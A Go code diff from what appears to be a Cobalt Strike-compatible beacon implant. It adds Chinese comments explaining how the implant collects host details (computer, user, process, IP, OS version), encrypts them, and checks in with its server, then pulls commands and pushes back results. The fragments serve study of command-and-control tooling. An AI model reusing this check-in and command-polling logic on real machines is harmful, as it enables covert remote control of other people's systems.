@@ -115,6 +115,7 @@ func MakePacket(replyType int, b []byte) []byte {
 
 }
 
+// 返回加密的MetaInfo信息，该信息被Rsa加密，并采用base64进行编码
 func EncryptedMetaInfo() (string, error) {
 	packetUnencrypted := MakeMetaInfo()
 	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
@@ -128,10 +129,12 @@ func EncryptedMetaInfo() (string, error) {
 
 /*
 MetaData for 4.1
+
 	Key(16) | Charset1(2) | Charset2(2) |
 	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
 	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
 */
+// 核心内容，对计算机的初步信息获取都在这个函数中，该函数返回一个byte字符数组
 func MakeMetaInfo() []byte {
 	crypt.RandomAESKey()
 	sha256hash := sha256.Sum256(config.GlobalKey)
@@ -163,7 +166,6 @@ func MakeMetaInfo() []byte {
 		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
 		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
 	}
-
 
 	//for Smart Inject, will not be implemented
 	ptrFuncAddr := 0
@@ -216,6 +218,7 @@ func MakeMetaInfo() []byte {
 	return packetToEncrypt
 }
 
+// 通过Get，将MetaInfo（加密后）发送到服务器，并通过包体的内容告诉服务器该数据包属于MetaInfo消息
 func FirstBlood() bool {
 	encryptedMetaInfo, _ = EncryptedMetaInfo()
 	for {
@@ -232,8 +235,8 @@ func FirstBlood() bool {
 	return true
 }
 
-func PullCommand() ([] byte, error) {
-	data, err := HttpGet(config.GetUrl, encryptedMetaInfo, config.Http_get_output_crypt)
+func PullCommand() ([]byte, error) {
+	data, err := HttpGet(config.GetUrl, encryptedMetaInfo, config.Http_get_output_crypt) // 获取制定路由下的内容，并进行解密后，返回
 	fmt.Println("pullcommand success")
 	if err != nil {
 		return nil, err
@@ -259,7 +262,7 @@ func ErrorProcess(err error) {
 	errMsgBytes := []byte(err.Error())
 	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
 	finalPaket := MakePacket(31, result)
-	PushResult(finalPaket)
+	PushResult(finalPaket) // 发送结果
 }
 
 /*
